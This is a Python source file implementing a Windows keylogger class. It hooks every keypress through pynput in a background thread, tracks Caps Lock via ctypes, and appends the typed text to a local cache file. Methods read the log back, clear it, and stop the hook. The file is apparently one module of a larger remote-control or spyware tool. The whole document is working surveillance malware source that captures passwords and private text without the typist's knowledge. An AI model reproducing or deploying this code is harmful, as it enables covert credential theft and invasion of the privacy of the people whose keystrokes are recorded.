from pynput.keyboard import Listener, Key
import os
import ctypes
import threading


class Keylogger:
    def __init__(self):
        self.path = os.path.join(
            os.path.dirname(__file__), "cache\\keylog.txt")
        self.caps = ctypes.windll.user32.GetKeyState(0x14) & 0x0001 != 0
        self.hooked = None

        self.clear()

    def print(self):
        with open(self.path, "r") as file:
            return file.read()

    def clear(self):
        with open(self.path, "w") as file:
            file.write("")

    def hook(self):
        if self.hooked:
            return

        def on_press(key):
            if not self.hooked:
                return False

            with open(self.path, "a") as file:
                if key == Key.caps_lock:
                    self.caps = not self.caps
                elif key == Key.space:
                    file.write(" ")
                elif key == Key.shift or key == Key.shift_r:
                    pass
                elif key == Key.enter:
                    file.write("Enter\n")
                else:
                    keyStr = str(key)

                    if keyStr == "\'\"\'":
                        keyStr = "\""
                    elif keyStr == "\"\'\"":
                        keyStr = "\'"
                    elif "\\\\" in keyStr:
                        keyStr = "\\"
                    else:
                        keyStr = keyStr.replace("'", "")

                    if len(keyStr) == 1 and self.caps:
                        keyStr = keyStr.swapcase()
                    elif keyStr.startswith("Key."):
                        keyStr = keyStr[4:].capitalize()

                    file.write(keyStr)

        def listen():
            with Listener(on_press=on_press) as listener:
                listener.join()

        self.hooked = threading.Thread(target=listen)
        self.hooked.start()

    def unhook(self):
        self.hooked = None
